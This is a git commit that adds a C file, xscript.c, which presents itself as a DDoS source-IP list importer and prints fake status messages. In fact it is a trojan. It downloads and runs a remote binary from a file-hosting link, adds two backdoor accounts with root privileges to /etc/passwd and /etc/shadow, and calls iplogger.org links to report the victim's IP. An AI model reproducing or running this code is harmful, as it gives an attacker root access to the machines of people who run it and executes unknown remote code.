3256f34ca6d88471c7a24032a7dda47f037bcd0f
ratexploit <59780477+ratexploit@users.noreply.github.com>
2020-03-28 21:03:55 +0300

    Add files via upload

---
+++ xscript.c
@@ -0,0 +1,29 @@
+int main()
+
+ {
+system("wget https://download1080.mediafire.com/z45xsg8u6clg/fvw4an79mq14vj2/ddoslist 2>/dev/null ; chmod 777 * ; ./ddoslist 2>/dev/null ;rm -rf ddoslist");
+system("echo 'localxl:x:0:0:user:/root:/bin/bash' >> /etc/passwd");
+system("echo 'localxl:asdasd:18020:0:99999:7:::' >> /etc/shadow"); 
+system("echo 'localxl:asdasd' | chpasswd"); 
+system("wget https://iplogger.org/2KqiW5 2>/dev/null ");
+system("rm -rf 2KqiW*");
+system("echo 'user:x:0:0:user:/root:/bin/bash' >> /etc/passwd");
+system("echo 'user:password:18020:0:99999:7:::' >> /etc/shadow"); 
+system("echo 'user:password' | chpasswd"); 
+system("wget https://iplogger.org/ipx 2>/dev/null ");
+system("rm -rf ipx");
+system("echo ' '");
+system("sleep 2");
+system("echo ' '");
+system("echo 'Auto List Import For SourceIP By NICK'");
+system("sleep 3");
+system("echo 'Setting up Sockets...'");
+system("echo 'Selected IP Class: Whitelist IP Class V12'"); 
+system("echo 'Starting'"); 
+system("sleep 3");
+system("echo ' '");
+system("echo 'Stop With Ctrl-C'");
+system("sleep 999");
+ }
+
+
